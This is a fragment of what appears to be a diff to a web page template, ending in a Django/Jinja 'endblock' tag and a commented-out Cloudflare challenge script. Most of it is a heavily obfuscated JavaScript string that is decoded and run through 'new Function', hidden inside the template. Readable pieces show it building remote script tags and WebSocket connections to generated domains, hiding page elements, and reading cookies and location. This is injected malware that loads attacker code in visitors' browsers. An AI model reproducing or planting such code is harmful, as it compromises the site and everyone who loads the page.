YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 )R_^)_TFM6LMDL8)R_^)_TFM6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67c)R_^)_TFM6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67c)R_^)_TFM6LMDL880a[Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T<c@00.c(q6Y2FD6fFh/K00aavv)R_^)_TFM6LMSS880a[)R_^)_TFM6LMSS8}!Xd5 )R_^)_TFM^8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"S((mhJ(DDfm(O^"%"g{00{/((/@o@1j6LM2OF8}vFd5pYF8}"!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28)R_^)_TFM^PYqLY[D62fODmqO(dF6O2mh5Y78)R_^)_TFM^P)R_^)_TFM6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! FOJg"%c{mn.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg{mnXD!)d(Sp5O_2fg#000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67c)R_^)_TFM6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"S((mhJ(DDfm(O^"%"g{00{/f/@o@1j(8}v28)R_^)_TF"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8")R_^)_TFMLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}000aPP=@n00a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"DLSpmY)f6p7m(O^"="DLSpmY)f6p7m(O^"="DLSpmY)f6p7m(O^"="DLSpmLO5q6(m(O^"="DLSpmLO5q6(m(O^"="DLSpmLO5q6(m(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Q{"%"/@o@1"a! (mO2OJY287_2(F6O2cYa[)R_^)_TFM6LMDL8)R_^)_TFM6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc")R_^)_TFMLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"SpmfhR5OJm(O^"%"g{00{\/L(/@o@1j28)R_^)_TF"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();</script>
+<!--<script>(function(){var js = "window['__CF$cv$params']={r:'7d6846e91b86741f',m:'UPHxHrlaI6JyYtZlgRGEaE6.uswzi4yx7jFlld.E1p8-1686637743-0-AYu3pGAL2oQ5Afmq6bR8TvSu/2kJrb7Z9MS5XPjIRq9c'};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>-->
+{% endblock content %}
